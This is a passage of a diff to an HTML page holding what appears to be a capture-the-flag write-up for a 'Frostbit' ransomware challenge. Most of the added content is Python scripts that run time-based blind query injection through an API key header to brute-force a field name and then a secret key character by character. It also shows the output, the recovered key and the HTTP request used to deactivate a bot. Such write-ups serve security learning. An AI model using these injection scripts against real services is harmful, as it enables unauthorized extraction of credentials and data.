+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1&#34;</span>,
+</span></span><span style="display:flex;"><span>        headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;X-Api-Key&#34;</span>: payload
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_keys</span>(needle, characters):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> characters:
+</span></span><span style="display:flex;"><span>        tmp_needle <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        time_taken <span style="color:#f92672">=</span> identify_keys(tmp_needle)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> time_taken <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            print(tmp_needle)
+</span></span><span style="display:flex;"><span>            iterate_keys(tmp_needle, characters)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> needle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_keys_reverse</span>(needle, characters):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> characters:
+</span></span><span style="display:flex;"><span>        tmp_needle <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        time_taken <span style="color:#f92672">=</span> identify_keys(tmp_needle)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> time_taken <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            print(tmp_needle)
+</span></span><span style="display:flex;"><span>            iterate_keys(tmp_needle, characters)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> needle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(iterate_keys(&#34;&#34;, found_letters)) # ==&gt; Returns &#34;activate_api_key|_rev|_key|_id&#34;</span>
+</span></span><span style="display:flex;"><span>print(iterate_keys_reverse(<span style="color:#e6db74">&#34;activate_api_key|_rev|_key|_id&#34;</span>, found_letters)) <span style="color:#75715e"># ==&gt; Returns &#34;deactivate_api_key|_rev|_key|_id&#34;</span></span></span></code></pre></div>
+<p>I had to run this cell two times, one for forward direction identification - and one for iterating my way backwards. Sure, I could have written a cleaner code. Output:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(CONCAT_SEPARATOR(&#39;|&#39;,</span> <span style="color:#960050;background-color:#1e0010">ATTRIBUTES(doc)),</span> <span style="color:#960050;background-color:#1e0010">&#39;ydeactivate_api_key|_rev|_key|_id&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(CONCAT_SEPARATOR(&#39;|&#39;,</span> <span style="color:#960050;background-color:#1e0010">ATTRIBUTES(doc)),</span> <span style="color:#960050;background-color:#1e0010">&#39;_deactivate_api_key|_rev|_key|_id&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(CONCAT_SEPARATOR(&#39;|&#39;,</span> <span style="color:#960050;background-color:#1e0010">ATTRIBUTES(doc)),</span> <span style="color:#960050;background-color:#1e0010">&#39;|deactivate_api_key|_rev|_key|_id&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">deactivate_api_key|_rev|_key|_id</span></span></span></code></pre></div>
+<h5 id="part-three---finding-the-api-key">Part three - finding the API key</h5>
+<p>The fieldname we are looking for is <code>deactivate_api_key</code>. Using this, I could start finding the API key:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">identify_apichar</span>(needle):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; OR CONTAINS(doc.deactivate_api_key, &#39;</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) OR sleep(5) OR &#39;1&#39;==&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1&#34;</span>,
+</span></span><span style="display:flex;"><span>        headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;X-Api-Key&#34;</span>: payload
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_api</span>(needle, characters):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> characters:
+</span></span><span style="display:flex;"><span>        tmp_needle <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        time_taken <span style="color:#f92672">=</span> identify_apichar(tmp_needle)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> time_taken <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            print(tmp_needle)
+</span></span><span style="display:flex;"><span>            find_api(tmp_needle, characters)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> needle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_uppercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits)
+</span></span><span style="display:flex;"><span>characters<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;_&#34;</span>)
+</span></span><span style="display:flex;"><span>characters<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;|&#34;</span>)
+</span></span><span style="display:flex;"><span>characters<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;-&#34;</span>)
+</span></span><span style="display:flex;"><span>find_api(<span style="color:#e6db74">&#34;&#34;</span>, characters)</span></span></code></pre></div>
+<p>Output (this took a way looooong time to do):</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(doc.deactivate_api_key,</span> <span style="color:#960050;background-color:#1e0010">&#39;abe</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">ad</span><span style="color:#ae81ff">-715e-4</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">-901</span><span style="color:#960050;background-color:#1e0010">b-c</span><span style="color:#ae81ff">9279</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">964</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">Z&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(doc.deactivate_api_key,</span> <span style="color:#960050;background-color:#1e0010">&#39;abe</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">ad</span><span style="color:#ae81ff">-715e-4</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">-901</span><span style="color:#960050;background-color:#1e0010">b-c</span><span style="color:#ae81ff">9279</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">964</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#ae81ff">90</span><span style="color:#960050;background-color:#1e0010">&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">CONTAINS(doc.deactivate_api_key,</span> <span style="color:#960050;background-color:#1e0010">&#39;abe</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">ad</span><span style="color:#ae81ff">-715e-4</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">-901</span><span style="color:#960050;background-color:#1e0010">b-c</span><span style="color:#ae81ff">9279</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">964</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#ae81ff">91</span><span style="color:#960050;background-color:#1e0010">&#39;)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">sleep(</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">OR</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;==&#39;</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">abe</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">ad</span><span style="color:#ae81ff">-715e-4</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">-901</span><span style="color:#960050;background-color:#1e0010">b-c</span><span style="color:#ae81ff">9279</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">964</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#ae81ff">91</span></span></span></code></pre></div>
+<p>Answer: <code>abe7a6ad-715e-4e6a-901b-c9279a964f91</code></p>
+<h5 id="part-four---deactivate">Part four - deactivate</h5>
+<p>With the API key found, I simply submitted it using my BOTID (15d977db-9fa9-48f8-be38-d36c2e21b12d) using Burp Suite:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /api/v1/frostbitadmin/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/deactivate?debug=1 <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">api.frostbit.app</span>
+</span></span><span style="display:flex;"><span>X-Api-Key<span style="color:#f92672">:</span> <span style="color:#ae81ff">abe7a6ad-715e-4e6a-901b-c9279a964f91</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span></span></span></code></pre></div>
+<p>Response:</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>HTTP/2 200 OK
+Server: nginx/1.27.1
+Date: Wed, 25 Dec 2024 19:43:01 GMT
+Content-Type: application/json
+Content-Length: 314
+Strict-Transport-Security: max-age=31536000
+
+{&#34;message&#34;:&#34;Response status code: 200, Response body: {\&#34;result\&#34;:\&#34;success\&#34;,\&#34;rid\&#34;:\&#34;15d977db-9fa9-48f8-be38-d36c2e21b12d\&#34;,\&#34;hash\&#34;:\&#34;f215785933f3a1ee0245a653781b94c1bc33c0340301355592492d9b8a2e9b30\&#34;,\&#34;uid\&#34;:\&#34;82237\&#34;}\nPOSTED WIN RESULTS FOR RID 15d977db-9fa9-48f8-be38-d36c2e21b12d&#34;,&#34;status&#34;:&#34;Deactivated&#34;}</code></pre></div>
+<p>The API key to deactivate is: <code>abe7a6ad-715e-4e6a-901b-c9279a964f91</code></p>
 
   <footer class="footline">
   </footer>
@@ -453,7 +508,7 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
 
         </div>
         <script>
-          window.index_js_url="/searchindex.en.js?1734966427";
+          window.index_js_url="/searchindex.en.js?1735157138";
         </script>
         <search><form action="/search/index.html" method="get">
           <div class="searchbox default-animation">
@@ -466,12 +521,12 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1734966427" defer></script>
-        <script src="/js/lunr/lunr.min.js?1734966427" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1734966427" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1734966427" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1734966427" defer></script>
-        <script src="/js/search.js?1734966427" defer></script>
+        <script src="/js/auto-complete.js?1735157138" defer></script>
+        <script src="/js/lunr/lunr.min.js?1735157138" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1735157138" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1735157138" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1735157138" defer></script>
+        <script src="/js/search.js?1735157138" defer></script>
       </div>
       <div id="R-homelinks" class="default-animation">
         <hr class="padding">
@@ -541,22 +596,22 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1734966427" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-color.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1734966427" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1734966427" defer></script>
-    <script src="/js/js-yaml.min.js?1734966427" defer></script>
-    <script src="/js/mermaid.min.js?1734966427" defer></script>
+    <script src="/js/clipboard.min.js?1735157138" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-color.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1735157138" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1735157138" defer></script>
+    <script src="/js/js-yaml.min.js?1735157138" defer></script>
+    <script src="/js/mermaid.min.js?1735157138" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{}");
     </script>
-    <script src="/js/theme.js?1734966427" defer></script>
+    <script src="/js/theme.js?1735157138" defer></script>
   </body>
 </html>
